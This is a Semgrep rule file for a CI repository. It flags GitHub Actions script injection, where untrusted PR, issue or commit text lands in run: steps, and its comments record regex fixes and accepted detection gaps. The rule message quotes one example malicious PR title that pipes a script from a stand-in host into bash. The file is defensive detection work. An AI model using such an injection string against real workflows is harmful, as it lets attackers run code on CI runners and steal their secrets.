# C1 (review finding): the Semgrep OSS security scan step in
# reusable-pr-quality.yml (`if: hashFiles('semgrep.yml', '.semgrep.yml',
# '.semgrep/', 'semgrep/') != ''`) has never executed in this repo's own CI,
# ever -- no fixture had a semgrep config, and this repo's own root didn't
# either. This file closes that: it's real content this repo can actually
# use (a GitHub Actions-specific rule, since that's what this repo mostly
# consists of), not a placeholder.
#
# Verified locally before being checked in (semgrep 1.172.0, close to but
# not identical to the pinned Docker image's version -- rule YAML syntax and
# basic pattern matching are stable across that gap): zero findings against
# this repo's entire real tracked-file tree (matches self-test's `push`
# trigger, where SEMGREP_BASELINE_COMMIT is empty and the scan is NOT
# diff-aware -- it sees everything, not just a PR's changes). A deliberately
# reintroduced violation (a raw pull-request-title expression, untrusted and
# attacker-controlled, inside a `run:` block) was confirmed caught, exit 1,
# in a scratch copy -- not spelled out literally here, so this comment
# itself doesn't trip the rule below (found the hard way: it did, the first
# time this file was written).
#
# Excludes .github/self-test-fixtures/ explicitly: those are deliberately-
# vulnerable/broken content by design (see e.g. python-bandit-blocking/) and
# scanning them would risk corrupting other fixture jobs' "single plausible
# failure point" design if a future fixture ever needed a .yml file of its
# own -- not a concern today (no current fixture has one), but excluded
# defensively rather than left implicit.
#
# REVIEW FIX (HIGH, confirmed): the original pattern (bare
# `\$\{\{\s*(...)\s*\}\}`, no context awareness) blocked its own recommended
# remediation -- moving the value into `env:` and referencing it as a shell
# variable still matched, because `generic`-mode pattern-regex has no
# YAML/run-vs-env structural awareness, only raw text. Reproduced directly:
# both the vulnerable `run: echo "${{ ... }}"` AND the recommended
# `env: KEY: ${{ ... }}` / `run: echo "$KEY"` fix tripped the same blocking
# rule. Fixed by requiring a non-whitespace, non-colon character to
# immediately precede the expression (skipping only whitespace in between) --
# a bare `KEY: ${{ ... }}` value assignment (env-block shape) has only a
# colon before it and no longer matches; `echo "${{ ... }}"` (a quote before
# it) and `X=${{ ... }}` (an equals sign before it) still do. Verified with
# real semgrep (1.172.0): the env: fix fixture now scans clean (0 findings),
# both original vulnerable fixtures still block (exit 1), and the whole real
# repo tree still scans clean (0 findings).
# KNOWN, ACCEPTED RESIDUALS (round-2 review, both real, both text-heuristic
# limitations of `generic`-mode pattern-regex having no true YAML awareness --
# not chasing full structural matching here, same posture as every other
# documented trade-off in this repo):
#   1. A `run: ${{ ... }}` step whose ENTIRE value is nothing but the bare
#      expression (no surrounding shell text at all -- an unusual way to
#      write a run: step, and still just as vulnerable as the caught cases)
#      is syntactically indistinguishable from `KEY: ${{ ... }}` by text
#      pattern alone and is NOT caught.
#   2. The env: fix verified above only covers the SINGLE-LINE form
#      (`KEY: ${{ ... }}`). A BLOCK-SCALAR env: value (`KEY: >-` or `KEY: |`
#      on one line, the expression alone on the next) still trips this rule:
#      the anchor char search can walk back across the line break and land
#      on the `>`/`|` indicator itself, which satisfies the "non-colon,
#      non-whitespace" requirement. Reproduced directly (round-2 review).
#      Considered restricting the skippable whitespace to same-line-only
#      (excluding newlines) to fix this -- rejected: that same-line
#      restriction would ALSO un-catch the genuinely vulnerable
#      `run: |` + bare-expression-on-its-own-line shape (residual 1's sibling,
#      currently caught only because it walks back to `run: |`'s own `|`) --
#      trading a false-positive annoyance for a false-negative security gap
#      is the wrong trade. Left as a known gap: a block-scalar env: value
#      hits the same "my fix trips the rule" experience this commit exists
#      to prevent. Workaround: use the single-line env: form, or add an
#      inline suppression comment.
rules:
  - id: github-actions-untrusted-context-in-run
    languages: [generic]
    severity: ERROR
    message: >-
      A GitHub Actions ${{ ... }} expression referencing an untrusted,
      attacker-controlled context (a PR title/body, an issue title/body, or
      a commit message) appears directly inside a `run:` script body.
      GitHub interpolates this BEFORE the shell ever sees it, so a PR
      titled e.g. `"; curl evil.sh | bash #` becomes literal shell code --
      the documented "GitHub Actions script injection" class. Pass the
      value through `env:` instead and reference it as a shell variable
      (`"$MY_VAR"`), which is not string-interpolated.
    patterns:
      - pattern-regex: '[^\n:\s]\s*\$\{\{\s*(github\.event\.(issue|pull_request)\.(title|body)|github\.event\.commits\[.*\]\.message|github\.head_ref)\s*\}\}'
    paths:
      include:
        - "*.yml"
        - "*.yaml"
      exclude:
        - ".github/self-test-fixtures/"
